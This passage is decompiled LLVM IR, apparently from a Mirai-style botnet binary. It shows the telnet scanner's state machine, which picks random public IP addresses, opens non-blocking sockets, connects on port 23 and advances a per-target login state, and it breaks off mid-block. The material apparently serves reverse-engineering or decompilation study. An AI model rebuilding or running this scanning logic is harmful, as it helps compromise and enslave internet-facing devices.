dec_label_pc_804c99c:                             ; preds = %dec_label_pc_804c99c, %dec_label_pc_804d8eb, %dec_label_pc_804c99c.preheader
  %stack_var_-624.0 = phi i32 [ %tmp4, %dec_label_pc_804c99c.preheader ], [ %stack_var_-624.0, %dec_label_pc_804c99c ], [ %stack_var_-624.1, %dec_label_pc_804d8eb ]
  %stack_var_-620.0 = phi i32 [ %tmp5, %dec_label_pc_804c99c.preheader ], [ %stack_var_-620.0, %dec_label_pc_804c99c ], [ %stack_var_-620.1, %dec_label_pc_804d8eb ]
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804c97e50, label %dec_label_pc_804c9a8, label %dec_label_pc_804c99c

dec_label_pc_804c9a8:                             ; preds = %dec_label_pc_804c99c, %dec_label_pc_804d8eb
  %storemerge45 = phi i32 [ %v4_804d8eb, %dec_label_pc_804d8eb ], [ 0, %dec_label_pc_804c99c ]
  %stack_var_-620.244 = phi i32 [ %stack_var_-620.1, %dec_label_pc_804d8eb ], [ %stack_var_-620.0, %dec_label_pc_804c99c ]
  %stack_var_-624.243 = phi i32 [ %stack_var_-624.1, %dec_label_pc_804d8eb ], [ %stack_var_-624.0, %dec_label_pc_804c99c ]
  %v1_804c9ae = mul i32 %storemerge45, 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  %v2_804c9bc = mul i32 %storemerge45, 28
  %v2_804c9be = add i32 %v2_804c9bc, %v2_804c8c7
  %v1_804c9c0 = add i32 %v2_804c9be, 16
  store i32 %v1_804c9c0, i32* %eax.global-to-local, align 4
  %v1_804c9c3 = inttoptr i32 %v1_804c9c0 to i32*
  %v2_804c9c3 = load i32, i32* %v1_804c9c3, align 4
  store i32 %v2_804c9c3, i32* %eax.global-to-local, align 4
  %v1_804c9c5 = icmp eq i32 %v2_804c9c3, 0
  %v1_804c9c7 = icmp eq i1 %v1_804c9c5, false
  br i1 %v1_804c9c7, label %dec_label_pc_804c9f7, label %dec_label_pc_804c9c9

dec_label_pc_804c9c9:                             ; preds = %dec_label_pc_804c9a8
  store i32 %storemerge45, i32* @ebx, align 4
  %v0_804c9cc = load i32, i32* @esp, align 4
  %v1_804c9cf = add i32 %v0_804c9cc, -16
  %v2_804c9cf = inttoptr i32 %v1_804c9cf to i32*
  store i32 0, i32* %v2_804c9cf, align 4
  %v1_804c9d1 = inttoptr i32 %storemerge45 to i32*
  %v2_804c9d1 = call i32 @__GI_time(i32* %v1_804c9d1)
  store i32 %v2_804c9d1, i32* @esi, align 4
  %v0_804c9de = load i32, i32* @ebx, align 4
  %v1_804c9e0 = mul i32 %v0_804c9de, 4
  store i32 %v1_804c9e0, i32* %edx.global-to-local, align 4
  %v2_804c9ee = mul i32 %v0_804c9de, 28
  %v2_804c9f0 = add i32 %v2_804c9ee, %v2_804c8c7
  %v1_804c9f2 = add i32 %v2_804c9f0, 16
  store i32 %v1_804c9f2, i32* %eax.global-to-local, align 4
  %v2_804c9f5 = inttoptr i32 %v1_804c9f2 to i32*
  store i32 %v2_804c9d1, i32* %v2_804c9f5, align 4
  br label %dec_label_pc_804c9f7

dec_label_pc_804c9f7:                             ; preds = %dec_label_pc_804c9a8, %dec_label_pc_804c9c9
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804ca0d = add i32 %v2_804ca0d, %v2_804c9bc
  %v4_804ca0d = inttoptr i32 %v3_804ca0d to i8*
  %v5_804ca0d = load i8, i8* %v4_804ca0d, align 4
  %v6_804ca0d = zext i8 %v5_804ca0d to i32
  %v8_804ca0d = and i32 %v2_804c9bc, -256
  %v9_804ca0d = or i32 %v6_804ca0d, %v8_804ca0d
  store i32 %v9_804ca0d, i32* %eax.global-to-local, align 4
  store i32 %v6_804ca0d, i32* %edx.global-to-local, align 4
  store i32 %v6_804ca0d, i32* @edi, align 4
  %v1_804ca31 = mul nuw nsw i32 %v6_804ca0d, 4
  %v2_804ca31 = add nuw nsw i32 %v1_804ca31, 134579456
  %v3_804ca31 = inttoptr i32 %v2_804ca31 to i32*
  %v4_804ca31 = load i32, i32* %v3_804ca31, align 4
  store i32 %v4_804ca31, i32* %eax.global-to-local, align 4
  switch i8 %v5_804ca0d, label %dec_label_pc_804d8eb [
    i8 0, label %dec_label_pc_804ca3a
    i8 1, label %dec_label_pc_804cda8
    i8 2, label %dec_label_pc_804cfed
    i8 3, label %dec_label_pc_804d129
    i8 4, label %dec_label_pc_804d271
    i8 5, label %dec_label_pc_804d3ad
    i8 6, label %dec_label_pc_804d4f5
    i8 7, label %dec_label_pc_804d78f
  ]

dec_label_pc_804ca3a:                             ; preds = %dec_label_pc_804c9f7
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804ca50 = add i32 %v2_804ca50, %v2_804c9bc
  %v4_804ca50 = inttoptr i32 %v3_804ca50 to i8*
  %v5_804ca50 = load i8, i8* %v4_804ca50, align 1
  %v10_804ca54 = icmp eq i8 %v5_804ca50, 1
  %v1_804ca56 = icmp eq i1 %v10_804ca54, false
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  br i1 %v1_804ca56, label %dec_label_pc_804cb05, label %dec_label_pc_804ca5c

dec_label_pc_804ca5c:                             ; preds = %dec_label_pc_804ca3a
  %v1_804ca74 = add i32 %v2_804c9be, 24
  store i32 %v1_804ca74, i32* %eax.global-to-local, align 4
  %v1_804ca77 = inttoptr i32 %v1_804ca74 to i32*
  %v2_804ca77 = load i32, i32* %v1_804ca77, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804ca9a = inttoptr i32 %v2_804c9be to i32*
  store i32 0, i32* %v2_804ca9a, align 4
  %v0_804ca9c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ca9c = add i32 %v0_804ca9c, 4
  store i32 %v1_804ca9c, i32* %eax.global-to-local, align 4
  %v0_804ca9f = load i32, i32* %edx.global-to-local, align 4
  %v2_804ca9f = inttoptr i32 %v1_804ca9c to i32*
  store i32 %v0_804ca9f, i32* %v2_804ca9f, align 4
  %v0_804caa1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804caa1 = add i32 %v0_804caa1, 4
  store i32 %v1_804caa1, i32* %eax.global-to-local, align 4
  %v0_804caa4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804caa4 = inttoptr i32 %v1_804caa1 to i32*
  store i32 %v0_804caa4, i32* %v2_804caa4, align 4
  %v0_804caa6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804caa6 = add i32 %v0_804caa6, 4
  store i32 %v1_804caa6, i32* %eax.global-to-local, align 4
  %v0_804caa9 = load i32, i32* %edx.global-to-local, align 4
  %v2_804caa9 = inttoptr i32 %v1_804caa6 to i32*
  store i32 %v0_804caa9, i32* %v2_804caa9, align 4
  %v0_804caab = load i32, i32* %eax.global-to-local, align 4
  %v1_804caab = add i32 %v0_804caab, 4
  store i32 %v1_804caab, i32* %eax.global-to-local, align 4
  %v0_804caae = load i32, i32* %edx.global-to-local, align 4
  %v2_804caae = inttoptr i32 %v1_804caab to i32*
  store i32 %v0_804caae, i32* %v2_804caae, align 4
  %v0_804cab0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cab0 = add i32 %v0_804cab0, 4
  store i32 %v1_804cab0, i32* %eax.global-to-local, align 4
  %v0_804cab3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cab3 = inttoptr i32 %v1_804cab0 to i32*
  store i32 %v0_804cab3, i32* %v2_804cab3, align 4
  %v0_804cab5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804cab5 = add i32 %v0_804cab5, 4
  %v0_804cab8 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cab8 = inttoptr i32 %v1_804cab5 to i32*
  store i32 %v0_804cab8, i32* %v2_804cab8, align 4
  store i32 %v1_804ca74, i32* %edx.global-to-local, align 4
  store i32 %v2_804ca77, i32* @eax, align 4
  store i32 %v2_804ca77, i32* %v1_804ca77, align 4
  store i32 %storemerge45, i32* @ebx, align 4
  %v1_804cadd = call i32 @GetRandomPublicIP(i32 %v6_804ca0d)
  %v0_804cae7 = load i32, i32* @ebx, align 4
  %v1_804cae9 = mul i32 %v0_804cae7, 4
  store i32 %v1_804cae9, i32* %edx.global-to-local, align 4
  %v2_804caf7 = mul i32 %v0_804cae7, 28
  %v2_804caf9 = add i32 %v2_804caf7, %v2_804c8c7
  %v1_804cafb = add i32 %v2_804caf9, 4
  store i32 %v1_804cafb, i32* %eax.global-to-local, align 4
  %v2_804cafe = inttoptr i32 %v1_804cafb to i32*
  store i32 %v1_804cadd, i32* %v2_804cafe, align 4
  br label %dec_label_pc_804cc17

dec_label_pc_804cb05:                             ; preds = %dec_label_pc_804ca3a
  %v5_804cb1b = load i8, i8* %v4_804ca50, align 1
  %v6_804cb1b = zext i8 %v5_804cb1b to i32
  %v9_804cb1b = or i32 %v6_804cb1b, %v8_804ca0d
  store i32 %v9_804cb1b, i32* %eax.global-to-local, align 4
  %v4_804cb1f = icmp eq i8 %v5_804cb1b, 0
  %v1_804cb21 = icmp eq i1 %v4_804cb1f, false
  br i1 %v1_804cb21, label %dec_label_pc_804cc17, label %dec_label_pc_804cb27

dec_label_pc_804cb27:                             ; preds = %dec_label_pc_804cb05
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804cb3f = add i32 %v2_804cb3f, %v2_804c9bc
  %v4_804cb3f = inttoptr i32 %v3_804cb3f to i8*
  %v5_804cb3f = load i8, i8* %v4_804cb3f, align 1
  %v1_804cb43 = add i8 %v5_804cb3f, 1
  store i8 %v1_804cb43, i8* %v4_804cb3f, align 1
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804cb79 = add i32 %v2_804cb79, %v2_804c9bc
  %v4_804cb79 = inttoptr i32 %v3_804cb79 to i8*
  %v5_804cb79 = load i8, i8* %v4_804cb79, align 2
  %v6_804cb79 = zext i8 %v5_804cb79 to i32
  %v9_804cb79 = or i32 %v6_804cb79, %v8_804ca0d
  %v1_804cb7d = add i32 %v9_804cb79, 1
  store i32 %v1_804cb7d, i32* @esi, align 4
  %v1_804cb97 = trunc i32 %v1_804cb7d to i8
  store i8 %v1_804cb97, i8* %v4_804cb79, align 2
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v5_804cbb1 = load i8, i8* %v4_804cb3f, align 1
  %v10_804cbb5 = icmp eq i8 %v5_804cbb1, 4
  %v1_804cbb7 = icmp eq i1 %v10_804cbb5, false
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  br i1 %v1_804cbb7, label %dec_label_pc_804cbd9, label %dec_label_pc_804cbb9

dec_label_pc_804cbb9:                             ; preds = %dec_label_pc_804cb27
  store i8 1, i8* %v4_804ca50, align 1
  br label %dec_label_pc_804d8eb

dec_label_pc_804cbd9:                             ; preds = %dec_label_pc_804cb27
  %v5_804cbef = load i8, i8* %v4_804cb79, align 2
  %v6_804cbef = zext i8 %v5_804cbef to i32
  %v9_804cbef = or i32 %v6_804cbef, %v8_804ca0d
  store i32 %v9_804cbef, i32* %eax.global-to-local, align 4
  %v10_804cbf3 = icmp eq i8 %v5_804cbef, 4
  %v1_804cbf5 = icmp eq i1 %v10_804cbf3, false
  br i1 %v1_804cbf5, label %dec_label_pc_804cc17, label %dec_label_pc_804cbf7

dec_label_pc_804cbf7:                             ; preds = %dec_label_pc_804cbd9
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804ca50, align 1
  br label %dec_label_pc_804d8eb

dec_label_pc_804cc17:                             ; preds = %dec_label_pc_804cbd9, %dec_label_pc_804cb05, %dec_label_pc_804ca5c
  store i32 2, i32* %stack_var_-604, align 4
  %v0_804cc20 = load i32, i32* @esp, align 4
  %v1_804cc23 = add i32 %v0_804cc20, -16
  %v2_804cc23 = inttoptr i32 %v1_804cc23 to i32*
  store i32 23, i32* %v2_804cc23, align 4
  %v0_804cc25 = load i32, i32* %stack_var_-604, align 4
  %v1_804cc25 = call i32 @htons(i32 %v0_804cc25)
  %v0_804cc2a = load i32, i32* @esp, align 4
  store i32 0, i32* %stack_var_-596, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  %v1_804cc62 = add i32 %v2_804c9be, 4
  store i32 %v1_804cc62, i32* %eax.global-to-local, align 4
  %v1_804cc65 = inttoptr i32 %v1_804cc62 to i32*
  %v2_804cc65 = load i32, i32* %v1_804cc65, align 4
  store i32 %v2_804cc65, i32* %eax.global-to-local, align 4
  store i32 %storemerge45, i32* @ebx, align 4
  %v1_804cc73 = add i32 %v0_804cc2a, 8
  %v2_804cc73 = inttoptr i32 %v1_804cc73 to i32*
  store i32 0, i32* %v2_804cc73, align 4
  %v1_804cc75 = add i32 %v0_804cc2a, 4
  %v2_804cc75 = inttoptr i32 %v1_804cc75 to i32*
  store i32 1, i32* %v2_804cc75, align 4
  %v2_804cc77 = inttoptr i32 %v0_804cc2a to i32*
  store i32 2, i32* %v2_804cc77, align 4
  %v2_804cc79 = load i32, i32* %stack_var_-596, align 4
  %sext = mul i32 %v1_804cc25, 65536
  %v3_804cc79 = sdiv i32 %sext, 65536
  %v4_804cc79 = call i32 @socket(i32 %v3_804cc79, i32 %v2_804cc65, i32 %v2_804cc79)
  store i32 %v4_804cc79, i32* @esi, align 4
  %v0_804cc86 = load i32, i32* @ebx, align 4
  %v2_804cc96 = mul i32 %v0_804cc86, 28
  %v3_804cc98 = add i32 %v2_804cc96, %v2_804c8c7
  %v4_804cc98 = inttoptr i32 %v3_804cc98 to i32*
  store i32 %v4_804cc79, i32* %v4_804cc98, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804ccb1 = inttoptr i32 %v2_804c9be to i32*
  %v4_804ccb1 = load i32, i32* %v3_804ccb1, align 4
  store i32 %v4_804ccb1, i32* %eax.global-to-local, align 4
  %v10_804ccb4 = icmp eq i32 %v4_804ccb1, -1
  br i1 %v10_804ccb4, label %dec_label_pc_804d8eb, label %dec_label_pc_804ccbd

dec_label_pc_804ccbd:                             ; preds = %dec_label_pc_804cc17
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804ccd3 = load i32, i32* %v3_804ccb1, align 4
  store i32 %v4_804ccd3, i32* %eax.global-to-local, align 4
  %v0_804ccd6 = load i32, i32* @esp, align 4
  %v1_804ccd9 = add i32 %v0_804ccd6, -8
  %v2_804ccd9 = inttoptr i32 %v1_804ccd9 to i32*
  store i32 0, i32* %v2_804ccd9, align 4
  %v1_804ccdb = add i32 %v0_804ccd6, -12
  %v2_804ccdb = inttoptr i32 %v1_804ccdb to i32*
  store i32 3, i32* %v2_804ccdb, align 4
  %v0_804ccdd = load i32, i32* %eax.global-to-local, align 4
  %v2_804ccdd = add i32 %v0_804ccd6, -16
  %v3_804ccdd = inttoptr i32 %v2_804ccdd to i32*
  store i32 %v0_804ccdd, i32* %v3_804ccdd, align 4
  %v1_804ccde = load i32, i32* %stack_var_-596, align 4
  %v3_804ccde = call i32 @__libc_fcntl(i32 %v2_804cc65, i32 %v1_804ccde, i32 0)
  %v0_804cce3 = load i32, i32* @esp, align 4
  %v12_804cce8 = or i32 %v3_804ccde, 2048
  store i32 %v12_804cce8, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804cd01 = load i32, i32* %v3_804ccb1, align 4
  store i32 %v4_804cd01, i32* %eax.global-to-local, align 4
  %v2_804cd07 = add i32 %v0_804cce3, 8
  %v3_804cd07 = inttoptr i32 %v2_804cd07 to i32*
  store i32 %v12_804cce8, i32* %v3_804cd07, align 4
  %v1_804cd08 = add i32 %v0_804cce3, 4
  %v2_804cd08 = inttoptr i32 %v1_804cd08 to i32*
  store i32 4, i32* %v2_804cd08, align 4
  %v0_804cd0a = load i32, i32* %eax.global-to-local, align 4
  %v3_804cd0a = inttoptr i32 %v0_804cce3 to i32*
  store i32 %v0_804cd0a, i32* %v3_804cd0a, align 4
  %v1_804cd0b = load i32, i32* %stack_var_-596, align 4
  %v3_804cd0b = call i32 @__libc_fcntl(i32 %v2_804cc65, i32 %v1_804cd0b, i32 0)
  %v0_804cd10 = load i32, i32* @esp, align 4
  store i32 %v2_804c855, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804cd2f = load i32, i32* %v3_804ccb1, align 4
  store i32 %v4_804cd2f, i32* %eax.global-to-local, align 4
  %v1_804cd35 = add i32 %v0_804cd10, 8
  %v2_804cd35 = inttoptr i32 %v1_804cd35 to i32*
  store i32 16, i32* %v2_804cd35, align 4
  %v2_804cd37 = add i32 %v0_804cd10, 4
  %v3_804cd37 = inttoptr i32 %v2_804cd37 to i32*
  store i32 %v2_804c855, i32* %v3_804cd37, align 4
  %v0_804cd38 = load i32, i32* %eax.global-to-local, align 4
  %v3_804cd38 = inttoptr i32 %v0_804cd10 to i32*
  store i32 %v0_804cd38, i32* %v3_804cd38, align 4
  %v1_804cd39 = load i32, i32* %stack_var_-596, align 4
  %v3_804cd39 = call i32 @__libc_connect(i32 %v2_804cc65, i32 %v1_804cd39, i32 0)
  store i32 %v3_804cd39, i32* %eax.global-to-local, align 4
  %v0_804cd3e = load i32, i32* @esp, align 4
  %v1_804cd3e = add i32 %v0_804cd3e, 16
  %v10_804cd41 = icmp eq i32 %v3_804cd39, -1
  %v1_804cd44 = icmp eq i1 %v10_804cd41, false
  br i1 %v1_804cd44, label %dec_label_pc_804cd7c, label %dec_label_pc_804cd46

dec_label_pc_804cd46:                             ; preds = %dec_label_pc_804ccbd
  %v1_804cd46 = call i32 @__errno_location(i32 %v2_804cc65)
  store i32 %v1_804cd46, i32* %eax.global-to-local, align 4
  %v1_804cd4b = inttoptr i32 %v1_804cd46 to i32*
  %v2_804cd4b = load i32, i32* %v1_804cd4b, align 4
  store i32 %v2_804cd4b, i32* %eax.global-to-local, align 4
  %v9_804cd4d = icmp eq i32 %v2_804cd4b, 115
  br i1 %v9_804cd4d, label %dec_label_pc_804cd46.dec_label_pc_804cd7c_crit_edge, label %dec_label_pc_804cd52

dec_label_pc_804cd46.dec_label_pc_804cd7c_crit_edge: ; preds = %dec_label_pc_804cd46
  %v0_804cd95.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804cd7c

dec_label_pc_804cd52:                             ; preds = %dec_label_pc_804cd46
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v0_804cd6b = load i32, i32* @esp, align 4
  %v2_804cd6e = add i32 %v0_804cd6b, -16
  %v3_804cd6e = inttoptr i32 %v2_804cd6e to i32*
  store i32 %v2_804c9be, i32* %v3_804cd6e, align 4
  %v1_804cd6f = call i32 @reset_telstate(i32 %v2_804cc65)
  store i32 %v1_804cd6f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804cd7c:                             ; preds = %dec_label_pc_804cd46.dec_label_pc_804cd7c_crit_edge, %dec_label_pc_804ccbd
  %v0_804cd95 = phi i32 [ %v0_804cd95.pre, %dec_label_pc_804cd46.dec_label_pc_804cd7c_crit_edge ], [ %v1_804cd3e, %dec_label_pc_804ccbd ]
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v1_804cd98 = add i32 %v0_804cd95, -12
  %v2_804cd98 = inttoptr i32 %v1_804cd98 to i32*
  store i32 1, i32* %v2_804cd98, align 4
  %v0_804cd9a = load i32, i32* %eax.global-to-local, align 4
  %v2_804cd9a = add i32 %v0_804cd95, -16
  %v3_804cd9a = inttoptr i32 %v2_804cd9a to i32*
  store i32 %v0_804cd9a, i32* %v3_804cd9a, align 4
  %v1_804cd9b = load i32, i32* %stack_var_-596, align 4
  %v2_804cd9b = inttoptr i32 %v2_804cc65 to i32*
  %v3_804cd9b = call i32 @advance_state(i32* %v2_804cd9b, i32 %v1_804cd9b)
  store i32 %v3_804cd9b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804cda8:                             ; preds = %dec_label_pc_804c9f7
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804cdb2, i32* @edi, align 4
  %v5_804cdb9 = call i8* @_memset(i8* %tmp38, i32 0, i32 32)
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v3_804cdd7 = inttoptr i32 %v2_804c9be to i32*
  %v4_804cdd7 = load i32, i32* %v3_804cdd7, align 4
  %v2_804cddc = udiv i32 %v4_804cdd7, 32
  store i32 %v2_804cddc, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804cdf5 = load i32, i32* %v3_804cdd7, align 4
  %v1_804cdf8 = urem i32 %v4_804cdf5, 32
  store i32 %v1_804cdf8, i32* %eax.global-to-local, align 4
  %v0_804cdfb = load i32, i32* @ebp, align 4
  %v2_804cdfb = mul nuw nsw i32 %v2_804cddc, 4
  %v3_804cdfb = add nsw i32 %v2_804cdfb, -312
  %v4_804cdfb = add i32 %v3_804cdfb, %v0_804cdfb
  %v5_804cdfb = inttoptr i32 %v4_804cdfb to i32*
  %v6_804cdfb = load i32, i32* %v5_804cdfb, align 4
  %v9_804cdfb = shl i32 1, %v1_804cdf8
  %v12_804cdfb = or i32 %v6_804cdfb, %v9_804cdfb
  store i32 %v12_804cdfb, i32* %v5_804cdfb, align 4
  store i32 0, i32* %stack_var_-324, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804ce2c = load i32, i32* %v3_804cdd7, align 4
  %v1_804ce2f = add i32 %v4_804ce2c, 1
  store i32 %v1_804ce2f, i32* %edx.global-to-local, align 4
  %v0_804ce32 = load i32, i32* @esp, align 4
  %v2_804ce3b = add i32 %v0_804ce32, -16
  %v3_804ce3b = inttoptr i32 %v2_804ce3b to i32*
  store i32 %v2_804ce35, i32* %v3_804ce3b, align 4
  %v1_804ce3c = add i32 %v0_804ce32, -20
  %v2_804ce3c = inttoptr i32 %v1_804ce3c to i32*
  store i32 0, i32* %v2_804ce3c, align 4
  store i32 %v2_804cdb2, i32* %eax.global-to-local, align 4
  %v2_804ce44 = add i32 %v0_804ce32, -24
  %v3_804ce44 = inttoptr i32 %v2_804ce44 to i32*
  store i32 %v2_804cdb2, i32* %v3_804ce44, align 4
  %v1_804ce45 = add i32 %v0_804ce32, -28
  %v2_804ce45 = inttoptr i32 %v1_804ce45 to i32*
  store i32 0, i32* %v2_804ce45, align 4
  %v0_804ce47 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ce47 = add i32 %v0_804ce32, -32
  %v3_804ce47 = inttoptr i32 %v2_804ce47 to i32*
  store i32 %v0_804ce47, i32* %v3_804ce47, align 4
  %v0_804ce48 = load i32, i32* %stack_var_-324, align 4
  %v2_804ce48 = load i32, i32* %stack_var_-316, align 4
  %v5_804ce48 = call i32 @__libc_select(i32 %v0_804ce48, i32 %arg1, i32 %v2_804ce48, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804ce48, i32* %eax.global-to-local, align 4
  %v0_804ce4d = load i32, i32* @esp, align 4
  %v12_804ce53 = icmp eq i32 %v5_804ce48, 1
  %v1_804ce57 = icmp eq i1 %v12_804ce53, false
  br i1 %v1_804ce57, label %dec_label_pc_804cf5e, label %dec_label_pc_804ce5d

dec_label_pc_804ce5d:                             ; preds = %dec_label_pc_804cda8
  store i32 4, i32* %stack_var_-328, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804ce87 = load i32, i32* %v3_804cdd7, align 4
  store i32 %v4_804ce87, i32* %edx.global-to-local, align 4
  %v2_804ce93 = add i32 %v0_804ce4d, 16
  %v3_804ce93 = inttoptr i32 %v2_804ce93 to i32*
  store i32 %v2_804ce8d, i32* %v3_804ce93, align 4
  store i32 %v2_804ce94, i32* %eax.global-to-local, align 4
  %v2_804ce9a = add i32 %v0_804ce4d, 12
  %v3_804ce9a = inttoptr i32 %v2_804ce9a to i32*
  store i32 %v2_804ce94, i32* %v3_804ce9a, align 4
  %v1_804ce9b = add i32 %v0_804ce4d, 8
  %v2_804ce9b = inttoptr i32 %v1_804ce9b to i32*
  store i32 4, i32* %v2_804ce9b, align 4
  %v1_804ce9d = add i32 %v0_804ce4d, 4
  %v2_804ce9d = inttoptr i32 %v1_804ce9d to i32*
  store i32 1, i32* %v2_804ce9d, align 4
  %v0_804ce9f = load i32, i32* %edx.global-to-local, align 4
  %v3_804ce9f = inttoptr i32 %v0_804ce4d to i32*
  store i32 %v0_804ce9f, i32* %v3_804ce9f, align 4
  %v0_804cea0 = load i32, i32* %stack_var_-332, align 4
  %v1_804cea0 = load i32, i32* %stack_var_-328, align 4
  %v2_804cea0 = load i32, i32* %stack_var_-324, align 4
  %v4_804cea0 = load i32, i32* %stack_var_-316, align 4
  %v5_804cea0 = call i32 @getsockopt(i32 %v0_804cea0, i32 %v1_804cea0, i32 %v2_804cea0, i32 %arg1, i32 %v4_804cea0)
  %v0_804cea5 = load i32, i32* @esp, align 4
  %v3_804cea8 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_804cea8, i32* %eax.global-to-local, align 4
  %v1_804ceae = icmp eq i32 %v3_804cea8, 0
  store i32 %v1_804c9ae, i32* @edx, align 4
  br i1 %v1_804ceae, label %dec_label_pc_804cedc, label %dec_label_pc_804ceb2

dec_label_pc_804ceb2:                             ; preds = %dec_label_pc_804ce5d
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v2_804cece = add i32 %v0_804cea5, 16
  %v3_804cece = inttoptr i32 %v2_804cece to i32*
  store i32 %v2_804c9be, i32* %v3_804cece, align 4
  %v0_804cecf = load i32, i32* %stack_var_-332, align 4
  %v1_804cecf = call i32 @reset_telstate(i32 %v0_804cecf)
  store i32 %v1_804cecf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8eb

dec_label_pc_804cedc:                             ; preds = %dec_label_pc_804ce5d
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804cef2 = load i32, i32* %v3_804cdd7, align 4
  store i32 %v4_804cef2, i32* %eax.global-to-local, align 4
  %v1_804cef8 = add i32 %v0_804cea5, 24
  %v2_804cef8 = inttoptr i32 %v1_804cef8 to i32*
  store i32 0, i32* %v2_804cef8, align 4
  %v1_804cefa = add i32 %v0_804cea5, 20
  %v2_804cefa = inttoptr i32 %v1_804cefa to i32*
  store i32 3, i32* %v2_804cefa, align 4
  %v0_804cefc = load i32, i32* %eax.global-to-local, align 4
  %v2_804cefc = add i32 %v0_804cea5, 16
  %v3_804cefc = inttoptr i32 %v2_804cefc to i32*
  store i32 %v0_804cefc, i32* %v3_804cefc, align 4
  %v0_804cefd = load i32, i32* %stack_var_-332, align 4
  %v1_804cefd = load i32, i32* %stack_var_-328, align 4
  %v2_804cefd = load i32, i32* %stack_var_-324, align 4
  %v3_804cefd = call i32 @__libc_fcntl(i32 %v0_804cefd, i32 %v1_804cefd, i32 %v2_804cefd)
  %v0_804cf02 = load i32, i32* @esp, align 4
  %v13_804cf07 = and i32 %v3_804cefd, -2049
  store i32 %v13_804cf07, i32* @ebx, align 4
  store i32 %v1_804c9ae, i32* %edx.global-to-local, align 4
  store i32 %v2_804c9bc, i32* %eax.global-to-local, align 4
  %v4_804cf20 = load i32, i32* %v3_804cdd7, align 4
  store i32 %v4_804cf20, i32* %eax.global-to-local, align 4
  %v2_804cf26 = add i32 %v0_804cf02, 8
  %v3_804cf26 = inttoptr i32 %v2_804cf26 to i32*
  store i32 %v13_804cf07, i32* %v3_804cf26, align 4
  %v1_804cf27 = add i32 %v0_804cf02, 4
  %v2_804cf27 = inttoptr i32 %v1_804cf27 to i32*
  store i32 4, i32* %v2_804cf27, align 4
  %v0_804cf29 = load i32, i32* %eax.global-to-local, align 4
  %v3_804cf29 = inttoptr i32 %v0_804cf02 to i32*
  store i32 %v0_804cf29, i32* %v3_804cf29, align 4
  %v0_804cf2a = load i32, i32* %stack_var_-332, align 4
  %v1_804cf2a = load i32, i32* %stack_var_-328, align 4
  %v2_804cf2a = load i32, i32* %stack_var_-324, align 4
  %v3_804cf2a = call i32 @__libc_fcntl(i32 %v0_804cf2a, i32 %v1_804cf2a, i32 %v2_804cf2a)
  %v0_804cf2f = load i32, i32* @esp, align 4
  store i32 %v1_804c9ae, i32* @edx, align 4
  store i32 %v2_804c9be, i32* %eax.global-to-local, align 4
  %v1_804cf4e = add i32 %v0_804cf2f, 4
  %v2_804cf4e = inttoptr i32 %v1_804cf4e to i32*
